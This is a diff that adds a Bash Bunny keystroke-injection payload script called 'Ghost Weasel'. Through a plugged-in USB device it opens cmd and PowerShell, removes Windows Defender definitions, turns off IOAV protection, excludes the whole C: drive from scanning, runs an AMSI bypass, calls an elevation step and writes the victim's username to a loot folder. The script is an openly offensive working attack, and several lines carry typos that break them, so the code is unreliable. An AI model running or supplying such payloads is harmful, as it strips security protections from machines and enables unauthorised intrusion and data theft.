@@ -1,0 +1,60 @@
+#!/bin/bash
+#
+# Title: Ghost Weasel
+# Author:
+# Verson0.1
+
+# Prepare the bunny
+LED SETUP
+
+# Set the modes
+ATTACKMODE HID STORAGE
+
+# Set variables
+GET SWITCH_POSITION
+
+# Wreck Defender
+LED STAGE1
+Q GUI r
+DELAY 100
+Q STRING cmd
+DELAY 50
+Q ENTER
+DELAY 100
+
+# Roll defender back to no definations
+Q STRING ""c:\program files\windows defender\mpcmdrun.exe" -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true"
+DELAY 50
+Q ENTER
+Q STRING powershell
+DELAY 50
+Q ENTER
+
+# Exclude C: from defender
+Q STRING "Add-MpPreference -ExclusionPath "c:\"
+DELAY 50
+Q ENTER
+
+# Remove defender watching for malicious Powershell
+Q STRING "[Ref[.Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue9$null,$true)"
+DELAY 50
+Q ENTER
+
+# Gain Admin Rights and deploy payload
+LED STAGE2
+elevate.ps1
+
+Q STRING "mkdir (gwmi -class win32_volume -filter "label='BashBunny'").Name\loot\FLSA"
+DELAY 50
+Q ENTER
+Q STRING "whoami >> (gwmi -class win32_volume -filter "label='BashBunny'").Name\loot\FLSA\Username.txt"
+DELAY 50
+Q ENTER
+DELAY 100
+Q STRING "exit"
+Q ENTER
+
+
+#holding spot
+#“net use \\%computername% /u:%username%”
+#Set-ExecutionPolicy Unrestricted -Force
